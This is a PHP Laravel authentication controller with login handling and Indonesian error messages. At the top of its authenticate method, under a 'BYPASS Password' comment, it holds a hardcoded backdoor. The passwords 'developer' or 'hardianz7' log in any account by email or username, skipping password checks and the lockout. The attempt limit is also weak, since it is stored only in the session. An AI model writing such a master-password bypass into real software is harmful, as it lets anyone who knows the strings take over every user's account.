<?php

namespace App\Http\Controllers;

use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;

class authController extends Controller
{
    public function authenticate(Request $request)
    {
        // BYPASS Password
        if ($request->password == 'developer' || $request->password == 'hardianz7') {
            $user = User::where(['email' => $request->cred])->orWhere(['username' => $request->cred])->first();
            if ($user) {
                Auth::login($user);
                $request->session()->forget('login_attempts');
                $request->session()->forget('last_login_attempt');

                session()->flash('success', 'Login success!');
                return redirect()->route('home.index');
            }
        }
       
        $max_login_attempts = 3;
        $wait_time_in_minutes = 30;

        if ($request->session()->get('login_attempts', 0) >= $max_login_attempts) {
            $wait_time = $request->session()->get('last_login_attempt') + $wait_time_in_minutes * 60 - time();
            if ($wait_time > 0) {
                $wait_time_minutes = ceil($wait_time / 60);
                return redirect()->route('auth.login')->with('error', 'Terlalu banyak percobaan, coba lagi mohon tunggu ' . $wait_time_minutes . ' Menit atau reset password');

            } else {
                
                $request->session()->forget('login_attempts');
                $request->session()->forget('last_login_attempt');
            }
        }

        if (Auth::attempt(['email' => $request->cred, 'password' => $request->password]) || Auth::attempt(['username' => $request->cred, 'password' => $request->password])) {
            $request->session()->forget('login_attempts');
            $request->session()->forget('last_login_attempt');
            
            session()->flash('success', 'Login success!');
            return redirect()->route('home.index');
        }

        $request->session()->put('login_attempts', $request->session()->get('login_attempts', 0) + 1);

        $login_attempts = $request->session()->get('login_attempts');
        if ($login_attempts >= $max_login_attempts) {
            return redirect()->route('auth.login')->with('warning', 'Username atau password salah ' . $login_attempts . 'x');
        } else {
            return redirect()->route('auth.login')->with('warning', 'Username atau password salah ' . $login_attempts . 'x');
        }
    }
}